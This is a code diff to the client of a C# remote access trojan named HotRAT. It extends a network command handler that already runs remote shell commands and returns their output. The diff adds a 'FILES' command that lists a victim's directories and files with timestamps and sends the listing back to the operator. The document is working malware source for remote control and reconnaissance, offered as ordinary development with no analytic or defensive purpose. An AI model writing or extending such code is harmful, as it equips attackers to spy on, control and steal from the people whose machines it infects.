@@ -14,7 +14,9 @@ namespace HotRAT.Client
         public static void Handle(string data,NetworkStream ns)
         {
             var lines = data.Split("\\n");
-            Console.WriteLine(string.Join(" ", lines));
+            if (lines.Length == 1)
+                lines = data.Split("\n");
+            Console.WriteLine(string.Join(" | ", lines));
             switch (lines[0].ToUpper())
             {
                 case "SHELL":
@@ -22,6 +24,35 @@ namespace HotRAT.Client
                     Console.WriteLine(shellR);
                     _ = SendText(shellR, ns);
                     break;
+                case "FILES":
+                    var dirPath = lines[1][..^9];
+                    var filesR = "FILES\n";
+
+                    if (Directory.Exists(dirPath))
+                    {
+                        var files = Directory.GetFiles(dirPath);
+                        foreach (var file in files)
+                        {
+                            var info = new FileInfo(file);
+                            filesR += $"{info.Name}|{info.LastWriteTime:yyyy-MM-dd HH:mm:ss}|FILE\n";
+                        }
+
+                        var dirs = Directory.GetDirectories(dirPath);
+                        foreach (var dir in dirs)
+                        {
+                            var info = new DirectoryInfo(dir);
+                            filesR += $"{info.Name}|{info.LastWriteTime:yyyy-MM-dd HH:mm:ss}|DIR\n";
+                        }
+                    }
+                    else
+                    {
+                        filesR += $"路径不存在: {dirPath}\n";
+                    }
+
+                    Console.WriteLine(filesR);
+                    _ = SendText(filesR, ns);
+                    break;
+
                 default:
                     break;
             }
